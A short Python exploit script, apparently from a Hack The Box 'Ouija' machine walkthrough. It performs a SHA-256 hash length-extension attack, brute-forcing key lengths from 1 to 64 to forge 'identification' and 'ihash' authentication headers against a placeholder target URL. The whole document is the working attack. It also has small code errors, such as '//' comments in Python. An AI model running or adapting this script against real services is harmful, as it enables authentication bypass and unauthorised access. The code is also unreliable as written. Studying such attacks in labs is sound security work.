import sys
import base64
import requests
import hlextend

# Add the path to the hlextend directory
sys.path.append('~/Desktop/HTB/Machines/Ouija/hlextend')

# Define the URL for the web request
url = "<Target_Url>"     //Change URL including Endpoint

# Function to make a web request and check for the word "fail"
def check_for_fail(number, id, ihash):
    headers = {
        'identification': id,
        'ihash': ihash
    }
    response = requests.get(url, headers=headers)
    print(number, end='\r', flush=True)
    if 'Invalid Token' not in response.content.decode():
        print(f"Success at number: {number}")
        print(f"successful id: {id}")
        print(f"successful ihash: {ihash}")
        return True
    return False

# Loop through numbers 1 through 64
for number in range(1, 65):
    sha = hlextend.new('sha256')
    hash_ext = sha.extend(b'<appeend>', b'<append_botauth>', number, '<Export_hash_value>').hex()   //Change The Values
    ascii_bytes = hash_ext.encode('utf-8')
    id = base64.b64encode(ascii_bytes).decode()
    ihash = sha.hexdigest()

    # Call the function and break the loop if "fail" is not found
    if check_for_fail(number, id, ihash):
        break
